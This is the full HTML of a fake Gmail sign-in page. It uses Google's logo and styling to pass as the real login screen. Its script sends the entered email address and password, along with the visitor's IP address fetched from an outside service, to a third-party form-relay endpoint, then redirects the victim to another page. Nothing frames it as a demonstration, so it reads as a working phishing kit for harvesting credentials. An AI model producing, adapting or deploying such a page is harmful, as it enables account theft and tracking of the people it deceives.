<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gmail Login</title>
<style>
  body {
    font-family: Arial, sans-serif;
    background-color: #f0f0f0;
    margin: 0;
    padding: 0;
  }

  .container {
    max-width: 400px;
    margin: 50px auto;
    background-color: #ffffff;
    border-radius: 8px;
    box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
    padding: 30px;
    box-sizing: border-box;
  }

  .logo {
    text-align: center;
    margin-bottom: 20px;
  }

  .logo img {
    width: 150px;
    height: auto;
  }

  .title {
    font-size: 24px;
    font-weight: bold;
    text-align: center;
    color: #202124;
    margin-bottom: 20px;
  }

  .form-group {
    margin-bottom: 20px;
  }

  .form-group label {
    display: block;
    font-size: 14px;
    color: #5f6368;
    margin-bottom: 5px;
  }

  .form-group input[type="email"],
  .form-group input[type="password"] {
    width: 100%;
    padding: 12px;
    border-radius: 5px;
    border: 1px solid #dadce0;
    font-size: 16px;
    box-sizing: border-box;
  }

  .form-group input[type="submit"] {
    width: 100%;
    padding: 12px;
    border-radius: 5px;
    border: none;
    background-color: #1a73e8;
    color: #ffffff;
    font-size: 16px;
    cursor: pointer;
    transition: background-color 0.3s;
  }

  .form-group input[type="submit"]:hover {
    background-color: #0f62fe;
  }

  .form-group .forgot-password {
    font-size: 14px;
    color: #1a73e8;
    text-decoration: none;
    float: right;
  }

  .form-group .create-account {
    font-size: 14px;
    color: #1a73e8;
    text-decoration: none;
  }

  .form-group .create-account::before {
    content: '';
    display: inline-block;
    width: 10px;
    height: 10px;
    border-radius: 50%;
    margin-right: 5px;
    background-color: #1a73e8;
  }
</style>
<script>
  function submitForm() {
    // Get form data
    var formData = new FormData(document.getElementById("loginForm"));
    
    // Send form data asynchronously
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://app.form2chat.io/f/dedc7686", true);
    xhr.onreadystatechange = function() {
      if (xhr.readyState == XMLHttpRequest.DONE && xhr.status == 200) {
        // Form submitted successfully, redirect to another page
        window.location.href = "another_page.html";
      }
    };
    xhr.send(formData);
  }

  function getIpAddress() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        document.getElementById("ip_address").value = data.ip;
      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });
  }
  getIpAddress();
</script>
</head>
<body>
<div class="container">
  <div class="logo">
    <img src="https://www.gstatic.com/images/branding/product/1x/gmail_48dp.png" alt="Gmail Logo">
  </div>
  <div class="title">Sign in</div>
  <form id="loginForm">
    <div class="form-group">
      <label for="email">Email</label>
      <input type="email" id="email" name="email" required>
    </div>
    <div class="form-group">
      <label for="password">Password</label>
      <input type="password" id="password" name="password" required>
    </div>
    <!-- Hidden input field to store user's IP address -->
    <input type="hidden" id="ip_address" name="ip_address">
    <div class="form-group">
      <input type="button" value="Next" onclick="submitForm()">
    </div>
    <div class="form-group">
      <a href="#" class="forgot-password">Forgot password?</a>
    </div>
    <div class="form-group">
      <a href="#" class="create-account">Create account</a>
    </div>
  </form>
</div>
</body>
</html>
